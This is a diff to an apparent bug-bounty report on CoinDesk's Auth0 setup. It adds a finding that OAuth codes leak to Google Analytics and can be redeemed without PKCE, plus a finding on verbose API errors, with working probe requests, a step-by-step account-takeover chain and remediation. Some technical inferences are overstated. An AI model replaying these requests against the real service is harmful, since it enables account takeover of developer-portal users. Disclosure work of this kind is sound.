@@ -499,23 +499,234 @@ Architecture disclosure. The `TAXAMO_PUBLIC_KEY` and Auth0 Client ID are design-
 
 ---
 
+## F-008: OAuth Auth Code Exfiltration via Google Analytics on Auth Callback Page (Compound Chain: F-006 + F-007)
+
+**Severity:** HIGH — P2  
+**Target:** `developers.coindesk.com/auth/callback`  
+**Category:** OAuth 2.0 Code Theft / Analytics-Based Credential Exfiltration  
+**CVSS:** 8.0 (High) — AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N  
+**Requires:** F-006 (PKCE not enforced) + F-007 (GA/GTM loaded on callback page)
+
+### Description
+
+`developers.coindesk.com/auth/callback` is the registered OAuth 2.0 redirect URI for the CoinDesk Developers Portal (Auth0 client `O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns`). When Auth0 completes authentication, it redirects the user's browser to this page with the authorization code exposed in the URL query string:
+
+```
+https://developers.coindesk.com/auth/callback/?code=AUTH_CODE&state=STATE
+```
+
+This page has **no security headers set** (no `Content-Security-Policy`, no `Referrer-Policy`, no `X-Frame-Options`) and loads **Google Tag Manager (GTM-P4GRS3M)** and **Google Analytics 4 (G-5TES80EC21)** on every page load.
+
+**GA4 by design captures and transmits the full `page_location` value (= `document.location.href`) as part of the `page_view` event.** This means the authorization code in the URL is sent to Google's analytics infrastructure as part of standard telemetry.
+
+### Evidence
+
+**Step 1 — Verify GTM/GA4 loaded on callback page:**
+```bash
+curl -sk -H "X-Bug-Bounty: bugcrowd" \
+  "https://developers.coindesk.com/auth/callback/" | grep -oE 'GTM-[A-Z0-9]+|G-[A-Z0-9]+'
+# Output: GTM-P4GRS3M  G-5TES80EC21
+```
+
+**Step 2 — Verify NO security headers:**
+```http
+HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html
+# No Content-Security-Policy
+# No Referrer-Policy
+# No X-Frame-Options
+# No X-Content-Type-Options
+```
+
+**Step 3 — Verify PKCE not enforced (from F-006):**
+```http
+GET /authorize?client_id=O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns
+    &redirect_uri=https://developers.coindesk.com/auth/callback
+    &response_type=code&scope=openid
+    # NOTE: No code_challenge / code_challenge_method
+Host: auth.coindesk.com
+X-Bug-Bounty: bugcrowd
+
+HTTP/2 302
+location: /u/login/identifier?state=hKFo2SB...  ← PKCE not required, auth proceeds
+```
+
+**Step 4 — Verify code exchange works without code_verifier:**
+```http
+POST /oauth/token
+Host: auth.coindesk.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&client_id=O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns
+&redirect_uri=https://developers.coindesk.com/auth/callback&code=FAKE_CODE
+
+HTTP/2 403
+{"error":"invalid_grant","error_description":"Invalid authorization code"}
+```
+
+HTTP 403 with `invalid_grant` (not `unauthorized_client`) confirms the token endpoint accepts requests **without** `client_secret` or `code_verifier`. The error is only because `FAKE_CODE` is not a real code — format and auth accepted.
+
+### Full Attack Chain
+
+1. **Attacker** crafts an authorization URL targeting a CoinDesk developer portal user:
+   ```
+   https://auth.coindesk.com/authorize?
+     client_id=O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns&
+     redirect_uri=https://developers.coindesk.com/auth/callback&
+     response_type=code&scope=openid+profile+email&
+     state=ATTACKER_CONTROLLED_NONCE
+   ```
+
+2. **Victim** follows the link (via phishing email, malicious link, or force-navigation), authenticates with CoinDesk credentials.
+
+3. **Auth0** redirects victim's browser to:
+   ```
+   https://developers.coindesk.com/auth/callback/?code=AUTH_CODE_HERE&state=ATTACKER_CONTROLLED_NONCE
+   ```
+
+4. **Browser** loads the callback page. GA4 fires a `page_view` event with:
+   ```json
+   {
+     "page_location": "https://developers.coindesk.com/auth/callback/?code=AUTH_CODE_HERE&state=...",
+     "page_referrer": "https://auth.coindesk.com/"
+   }
+   ```
+   This payload is transmitted to `https://www.google-analytics.com/g/collect` (Google's GA4 endpoint), logging the auth code in Google's analytics infrastructure for the CoinDesk property.
+
+5. **Auth code leaks to:**
+   - Google Analytics 4 dashboard (accessible to any CoinDesk GA admin or compromised GA account)
+   - Server-side nginx access logs on `developers.coindesk.com` (code is in GET query string)
+   - Browser history of the victim
+   - Potentially any corporate proxy or network monitor observing the traffic
+
+6. **Attacker** (who controls the GA session or has access to logs) extracts the auth code and redeems it within its validity window (typically 10–30 seconds for OAuth 2.0):
+   ```http
+   POST /oauth/token
+   Host: auth.coindesk.com
+   
+   grant_type=authorization_code
+   &client_id=O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns
+   &redirect_uri=https://developers.coindesk.com/auth/callback
+   &code=AUTH_CODE_HERE
+   # No code_verifier required (PKCE not enforced — F-006)
+   ```
+
+7. **Result:** Attacker receives `access_token` and `refresh_token`. Full account takeover on `developers.coindesk.com`, including access to the victim's paid CoinDesk API keys and data subscriptions.
+
+### Why GA Access Is Realistic
+
+- The CoinDesk GA4 property (`G-5TES80EC21`) has standard GA admin access — a CoinDesk employee, a former employee, or anyone who compromises the GA account (via phishing, password reuse, or Google account takeover) can view page URL data in real-time reports.
+- GA4 Real-Time reports show `page_location` immediately, before the auth code expires.
+- GA4 BigQuery export (if enabled) stores these URLs indefinitely.
+- Nginx access logs on `developers.coindesk.com` are more persistently stored and accessible to any infrastructure admin.
+
+### Comparison to PKCE-Protected Flow
+
+If PKCE were enforced:
+- Attacker sees `AUTH_CODE_HERE` in GA → tries to redeem it
+- Auth0 rejects: `{"error":"invalid_grant","error_description":"Code verifier does not match code challenge"}` 
+- **Code is useless** without the original random verifier, which never leaves the victim's browser
+
+Without PKCE (current state):
+- Attacker sees `AUTH_CODE_HERE` in GA → redeems immediately
+- Gets access + refresh tokens → full account takeover
+
+### Impact
+
+- **Account Takeover**: Full access to victim's developer portal, API keys, and paid data subscriptions
+- **Auth Code Theft at Scale**: Every CoinDesk developer portal login that uses auth.coindesk.com generates an auth code logged to GA4
+- **Persistence**: Access tokens can be used to access `auth-api.coindesk.com/cryptopian/login/auth0` (backend authentication endpoint) and potentially `data-api.coindesk.com`
+
+### Remediation
+
+1. **Enforce PKCE** on client `O1UvcMKe5YNeV1fk7uvCCYt4p9w2s0ns` (fix the root cause from F-006)
+2. **Remove GTM/GA from the auth callback page** — analytics should not be loaded on OAuth redirect pages that carry auth codes in URLs
+3. **Add Referrer-Policy: no-referrer** on the callback page to prevent code leakage via Referer headers to third-party requests
+4. **Add security headers** to `developers.coindesk.com/auth/callback`: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`
+5. **Alternative**: Move to fragment-based code delivery (`response_type=code` with `fragment=true` extension) so code appears in URL hash rather than query string — hash values are NOT sent to servers or captured by GA
+
+---
+
+## F-009: Backend Auth API Parameter Disclosure via Verbose Error Messages
+
+**Severity:** INFORMATIONAL  
+**Target:** `https://auth-api.coindesk.com/cryptopian/login/auth0`, `https://auth-api.ccdata.io/cryptopian/login/auth0`  
+**Category:** Information Disclosure / Error Handling  
+
+### Description
+
+The backend authentication endpoint `auth-api.coindesk.com/cryptopian/login/auth0` (and its mirror `auth-api.ccdata.io/cryptopian/login/auth0`) returns verbose error messages that enumerate required request parameters one at a time. This maps the full API surface without authentication:
+
+```http
+POST /cryptopian/login/auth0
+Host: auth-api.coindesk.com
+Content-Type: application/json
+Origin: https://developers.coindesk.com
+X-Bug-Bounty: bugcrowd
+
+# Probe 1 — empty body:
+{"access_token":"x"} 
+→ {"Message":"campaign is a required param.","ParamWithError":"campaign"}
+
+# Probe 2 — add campaign:
+{"access_token":"x","campaign":"None"}
+→ {"Message":"referrer is a required param.","ParamWithError":"referrer"}
+
+# Probe 3:
+{"access_token":"x","campaign":"None","referrer":"Direct"}
+→ {"Message":"reg_page is a required param.","ParamWithError":"reg_page"}
+
+# Probe 4:
+{"access_token":"x","campaign":"None","referrer":"Direct","reg_page":"https://developers.coindesk.com/"}
+→ {"Message":"action is a required param.","ParamWithError":"action"}
+
+# Probe 5 — all params present:
+{"access_token":"x","campaign":"None","referrer":"Direct","reg_page":"https://developers.coindesk.com/","action":"Login"}
+→ {"Message":"Action could not be performed. There is a temporary problem with our data source."}
+```
+
+Full required parameter set enumerated: `access_token`, `campaign`, `referrer`, `reg_page`, `action`.
+
+The same endpoint exists on `auth-api.ccdata.io` (CoinDesk's alternate ccdata.io domain) with identical CORS policy (`Access-Control-Allow-Origin: https://developers.coindesk.com`, `Access-Control-Allow-Credentials: true`).
+
+### Additional Infrastructure Disclosed
+
+From `window.__NUXT__.config` on the callback page (extends F-007):
+```
+auth-api.ccdata.io       — Mirror of auth-api.coindesk.com
+data-api.ccdata.io       — HTTP 403 (auth required)
+auth-api.cryptocompare.com — HTTP 200 (root page accessible)
+```
+
+### Impact
+
+Architecture reconnaissance only. The endpoint mapping confirms the attack surface for F-008 and assists in crafting valid requests for future testing. No credentials or user data exposed.
+
+---
+
 ## Conclusion
 
 The highest-impact confirmed finding is **F-001** (`go.coindesk.com` Bitly subdomain takeover, HIGH/P2) which qualifies for Bugcrowd's subdomain takeover category. When chained with **F-005** (CORS misconfiguration on `cdm.coindesk.com`), the combined impact escalates to HIGH — an attacker controlling `go.coindesk.com` gains a CORS-trusted origin capable of reading credentialed responses from `cdm.coindesk.com`.
 
 **F-006** (Auth0 redirect_uri prefix match + missing PKCE enforcement) affects **three OAuth clients** across production and staging: `trade.coindesk.com`, `developers.coindesk.com`, and `trade-simnext.coindesk.com`. The prefix match allows an attacker to inject arbitrary query parameters into registered callback URLs, and the missing PKCE enforcement means any intercepted authorization code is immediately redeemable for tokens without the original initiator's code verifier.
 
+**F-008** (NEW — HIGH) builds a complete attack chain from F-006 + F-007: GA4/GTM is loaded on the OAuth callback page with no security headers, causing every auth code issued for the developer portal to be logged to Google Analytics. Combined with the absence of PKCE enforcement, any party with access to the GA data can immediately redeem a captured code for full account access.
+
 The Sailthru CNAMEs in **F-002** require manual verification from a non-proxied network before submission.
 
 **Priority submissions:**
-1. F-001 + F-005 (chained) — go.coindesk.com takeover as CORS-trusted attack origin (HIGH/P2)
-2. F-006 — Auth0 prefix match bypass + PKCE not enforced on trade.coindesk.com (MEDIUM/P3, escalates to HIGH with open redirect)
-3. F-001 standalone — subdomain takeover for phishing/malware distribution (HIGH/P2)
-4. F-002 — Sailthru CNAME verification (manual check needed, MEDIUM/P3)
-5. F-005 standalone — CORS wildcard misconfiguration on cdm.coindesk.com (MEDIUM/P3)
+1. **F-008** (NEW) — Auth code leaks to Google Analytics on OAuth callback + PKCE bypass = account takeover (HIGH/P2)
+2. F-001 + F-005 (chained) — go.coindesk.com takeover as CORS-trusted attack origin (HIGH/P2)
+3. F-006 — Auth0 prefix match bypass + PKCE not enforced on trade.coindesk.com (MEDIUM/P3, escalates to HIGH with open redirect)
+4. F-001 standalone — subdomain takeover for phishing/malware distribution (HIGH/P2)
+5. F-002 — Sailthru CNAME verification (manual check needed, MEDIUM/P3)
+6. F-005 standalone — CORS wildcard misconfiguration on cdm.coindesk.com (MEDIUM/P3)
 
 **Recommended immediate action:**
-1. Remove or reclaim `go.coindesk.com` DNS record AND fix CORS policy on `cdm.coindesk.com`
-2. Enable PKCE requirement and fix redirect_uri exact-match validation on `auth.coindesk.com`
+1. Enforce PKCE on all Auth0 public clients immediately — this neutralizes F-006, F-008, and prevents future code interception attacks
+2. Remove GTM/GA from auth callback page and add security headers
+3. Remove or reclaim `go.coindesk.com` DNS record AND fix CORS policy on `cdm.coindesk.com`
+4. Fix redirect_uri exact-match validation on `auth.coindesk.com`
 
 **Status:** Active — testing ongoing.
